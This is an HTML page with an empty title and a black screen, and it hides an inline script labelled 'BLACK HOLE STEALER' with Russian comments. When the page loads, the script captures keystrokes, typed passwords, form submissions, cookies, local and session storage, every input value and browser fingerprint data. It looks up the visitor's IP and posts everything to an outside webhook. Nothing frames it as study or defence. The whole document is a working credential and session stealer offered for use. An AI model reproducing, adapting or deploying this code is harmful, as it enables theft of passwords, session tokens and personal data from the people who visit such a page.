<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title></title>
<style>
* { margin:0; padding:0; }
body { background: #000; width:100vw; height:100vh; overflow:hidden; }
</style>
</head>
<body>
<script>
// ===== BLACK HOLE STEALER - ONE BIG LOG =====
(function() {
    // ===== ТВОЙ ВЕБХУК =====
    const WEBHOOK = 'https://eorw0sly29vshxa.m.pipedream.net';
    
    // ===== ОДИН БОЛЬШОЙ ЛОГ =====
    const log = {
        target: window.location.hostname || 'unknown',
        url: window.location.href,
        ip: 'unknown',
        cookies: 'No cookies',
        localStorage: {},
        sessionStorage: {},
        browser: {},
        forms: [],
        inputs: [],
        plugins: [],
        keylog: '',
        submittedForms: [],
        passwordCapture: {},
        timestamp: new Date().toISOString()
    };
    
    // ===== ОТПРАВКА ОДНОГО БОЛЬШОГО ЛОГА =====
    function sendFinalLog() {
        log.timestamp = new Date().toISOString();
        try {
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(log)
            });
        } catch(e) {}
    }
    
    // ===== IP =====
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => {
            log.ip = data.ip;
            collectAllData();
        })
        .catch(() => {
            collectAllData();
        });
    
    // ===== KEYLOGGER (буферизация) =====
    let keylogBuffer = '';
    document.addEventListener('keydown', function(e) {
        if (e.key.length === 1) {
            keylogBuffer += e.key;
        }
        if (e.key === 'Enter' || e.key === 'Tab') {
            if (keylogBuffer.length > 0) {
                log.keylog += keylogBuffer + '\n';
                keylogBuffer = '';
            }
        }
    });
    
    // ===== ПЕРЕХВАТ SUBMIT =====
    document.addEventListener('submit', function(e) {
        const form = e.target;
        const data = {};
        new FormData(form).forEach((val, key) => data[key] = val);
        log.submittedForms.push({
            action: form.action || 'none',
            method: form.method || 'GET',
            data: data,
            timestamp: new Date().toISOString()
        });
    }, true);
    
    // ===== ПЕРЕХВАТ ПАРОЛЕЙ =====
    document.addEventListener('input', function(e) {
        if (e.target.tagName === 'INPUT' && e.target.type === 'password') {
            log.passwordCapture[e.target.name || e.target.id || 'password'] = e.target.value;
        }
    }, true);
    
    function collectAllData() {
        // ===== COOKIES =====
        log.cookies = document.cookie || 'No cookies';
        
        // ===== LOCAL STORAGE =====
        for (let key in localStorage) {
            try { log.localStorage[key] = localStorage[key]; } catch(e) {}
        }
        
        // ===== SESSION STORAGE =====
        for (let key in sessionStorage) {
            try { log.sessionStorage[key] = sessionStorage[key]; } catch(e) {}
        }
        
        // ===== BROWSER INFO =====
        log.browser = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'direct',
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
        
        // ===== FORMS =====
        document.querySelectorAll('form').forEach(form => {
            const data = {};
            new FormData(form).forEach((val, key) => data[key] = val);
            log.forms.push({
                action: form.action || 'none',
                method: form.method || 'GET',
                data: data
            });
        });
        
        // ===== INPUTS =====
        document.querySelectorAll('input, textarea, select').forEach(el => {
            log.inputs.push({
                tag: el.tagName,
                type: el.type || 'text',
                name: el.name || '',
                id: el.id || '',
                value: el.value || '',
                placeholder: el.placeholder || ''
            });
        });
        
        // ===== PLUGINS =====
        for (let i = 0; i < navigator.plugins.length; i++) {
            log.plugins.push(navigator.plugins[i].name);
        }
        
        // ===== ДОБАВЛЯЕМ КЛЮЧЕЛОГ =====
        if (keylogBuffer.length > 0) {
            log.keylog += keylogBuffer;
            keylogBuffer = '';
        }
        
        // ===== ОТПРАВЛЯЕМ ОДИН БОЛЬШОЙ ЛОГ =====
        sendFinalLog();
    }
})();
</script>
</body>
</html>
